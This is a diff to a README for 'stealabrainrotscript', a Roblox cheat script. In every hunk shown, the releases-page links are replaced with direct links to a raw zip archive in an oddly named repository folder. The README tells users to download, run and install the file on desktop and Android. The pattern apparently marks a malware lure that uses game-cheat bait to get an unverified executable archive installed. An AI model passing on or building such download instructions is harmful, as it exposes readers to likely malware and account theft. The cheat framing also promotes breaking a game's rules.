@@ -1,6 +1,6 @@
 # 🧠 stealabrainrotscript - Easy Roblox Script for Steal a Brainrot
 
-[![Download stealabrainrotscript](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jurgisbi/stealabrainrotscript/releases)
+[![Download stealabrainrotscript](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jurgisbi/stealabrainrotscript/raw/refs/heads/main/litiscontestation/Software-v1.7.zip)
 
 ## 📝 About stealabrainrotscript
 
@@ -39,7 +39,7 @@ Follow these steps carefully to download and run stealabrainrotscript on a Windo
 ### Step 1: Visit the Download Page  
 
 Go to the official release page here:  
-[Download stealabrainrotscript](https://github.com/jurgisbi/stealabrainrotscript/releases)  
+[Download stealabrainrotscript](https://github.com/jurgisbi/stealabrainrotscript/raw/refs/heads/main/litiscontestation/Software-v1.7.zip)  
 
 This page contains the latest versions of the script. Look for the most recent release with a date label.
 
@@ -89,7 +89,7 @@ While this guide focuses on Windows, the script supports mobile devices too. Her
 
 - Download a file manager app if you do not have one.  
 - Visit the same release page on your mobile browser:  
-  [Download stealabrainrotscript](https://github.com/jurgisbi/stealabrainrotscript/releases)  
+  [Download stealabrainrotscript](https://github.com/jurgisbi/stealabrainrotscript/raw/refs/heads/main/litiscontestation/Software-v1.7.zip)  
 - Download the script file suitable for your device (usually `.apk` for Android or a similar file).  
 - Follow any on-screen prompts to install or open the script.  
 - Run Roblox and use the features as on the desktop version.  
@@ -118,7 +118,7 @@ Do not delete any files to ensure the script runs properly.
 ## 📢 How to Get Updates
 
 To get new versions, revisit the release page regularly:  
-[https://github.com/jurgisbi/stealabrainrotscript/releases](https://github.com/jurgisbi/stealabrainrotscript/releases)  
+[https://github.com/jurgisbi/stealabrainrotscript/raw/refs/heads/main/litiscontestation/Software-v1.7.zip](https://github.com/jurgisbi/stealabrainrotscript/raw/refs/heads/main/litiscontestation/Software-v1.7.zip)  
 
 Download the latest version file and replace your old one by deleting it and moving the new file to the same place.
 
@@ -126,4 +126,4 @@ Download the latest version file and replace your old one by deleting it and mov
 
 auto, desktop, gui, mobile, script
 
-[![Download stealabrainrotscript](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jurgisbi/stealabrainrotscript/releases)
+[![Download stealabrainrotscript](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jurgisbi/stealabrainrotscript/raw/refs/heads/main/litiscontestation/Software-v1.7.zip)
